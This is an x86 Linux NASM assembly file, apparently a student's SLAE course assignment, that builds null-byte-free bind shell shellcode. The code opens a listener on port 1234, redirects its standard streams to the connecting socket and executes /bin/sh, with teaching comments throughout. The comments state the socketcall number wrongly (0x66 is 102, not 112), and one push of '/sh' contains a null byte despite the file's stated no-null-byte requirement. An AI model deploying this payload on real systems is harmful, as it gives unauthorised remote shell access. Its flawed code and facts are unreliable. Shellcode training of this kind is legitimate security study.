; SLAE-X 
; thanks to writesup from previou students :] 
; syscalls doc is here: /usr/include/i386-linux-gnu/asm/unistd_32.h 
; assignment 1: create a bind shell 
; originality : (not much in this assignment) NASM function allowing to specify port in human readable format and my own assembly code to avoid null bytes 
; requirement : no null byte only , verify with objdump -d simplebindshell -M intel | grep 00


; this function allows you to specify port in human readable format 
%define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)
%define _port 1234
PORT equ htons(_port) 
; this function is NOT injected in assembly by compiler, it is computed at build time 

global _start 


_start: 

; OK here is how socket syscall works on x86 linux, first argument specifies which call to execute (bind, listen, accept, send ...) and resides in EBX 
; second parameter is a pointer to an array of parameters for that corresponding syscall and resides in ECX, let s do it.  
; source : http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html 


; syscall "socket", with argument SYS_SOCKET create a fd, 0x1 in ebx 
; arguments to the call are PF_INET = AF_INET (2), SOCK_STREAM (1), IPPROTO_IP(0) in reverse order  
; here we use bl register instead of ebx because "mov ebx,0x1" contains null bytes, like this : b8 66 > 00 00 00 <   mov eax,0x66
mov    bl,0x1
; the two next operands simply replace "push 0x0" which also contains a null byte, we will usually use xor x,x and push x to push 0x0  
xor eax,eax
push eax 
; arguments 0x1 and 0x2 do not contains null bytes :] 
push   0x1
push   0x2
; we create an array  by sending a pointer to it as argument, the array lives on the stack, this is why we pushed previous values onto the stack, to create it     
mov    ecx,esp
; syscall "socket" is number 112, 0x66 in hex 
mov    al,0x66
int    0x80


; saving the file descriptor received into edi, i tried to use the .bss section at first but it did not work on shellcode injection (you dont have .bss since you inject into other process ?) 
mov    edi,eax
; syscall "socket", with SYS_BIND bind argument provided, 0x2 in ebx  
mov    bl,0x2
; bind function is : int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
; again we push onto the stack to create an array / struct   
; push 0x0 
xor    esi,esi
push   esi
; we send the port in the struct 
push word  PORT 
push word  0x2
; and make an array out of this 
mov    ecx,esp
; length is 16  
push   0x10
; we push the array / struct 
push   ecx
; file descriptor as argument 1 is pushed last 
push   edi
mov    ecx,esp
mov    al,0x66
int    0x80


; syscall "socket", with argument listen SYS_LISTEN, 0x4 in ebx  
; int listen(int sockfd, int backlog) 
; push 0x0 
xor esi,esi
push   esi
; push file descriptor 
push   edi
mov    ecx,esp
mov    al,0x66
mov    bl,0x4
int    0x80



; syscall "socket", with argument accept SYS_ACCEPT, 0x5 in ebx  
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) 
mov    al,0x66
mov    bl,0x5
; push 0x0 two times for aguments to accept 
xor esi,esi
push   esi
push   esi
; file descriptor fd 
push   edi
mov    ecx,esp
int    0x80



; duplicating fd from socket to stdin stdout stderr of the process 
mov    ebx,eax
; we need to clean ecx, at this stage it contains data "0xBFFFF39C"
; since we use "mov cl" and not mov ecx (to avoid null byte) we dont want to have this remaining data and break our loop 
xor ecx,ecx
mov    cl,0x2
; we use a loop and decrease cl register, ie from 2 to 0 , 2 - 1 - 0 
loop: 
; syscall dup2 
mov    al,0x3f
int    0x80
dec    ecx
; sign flag is not set if ecx is not inferior to 0 
; so we use "jump if not sign" which check if the flag is on   
jns    loop 



; syscall "execve", with arguments /bin//sh  and a null string for envp argument  
; int execve(const char *filename, char *const argv[],char *const envp[]);
mov    al,0xb
; push 0x0 
xor esi,esi
push   esi 
; "/bin/sh" 
push   0x0068732f ; "/sh" 
push   0x6e69622f ; "/bin"
; create a string pointer 
mov    ebx,esp
; push null 
xor esi,esi
push   esi 
mov    edx,esp
push   ebx
mov    ecx,esp
int    0x80



; exit cleanly 
; clean up eax 
xor eax,eax 
; avoid null byte  
mov    al,0x1
; move 0 into ebx without null byte 
xor esi,esi 
mov    ebx,esi 
int    0x80
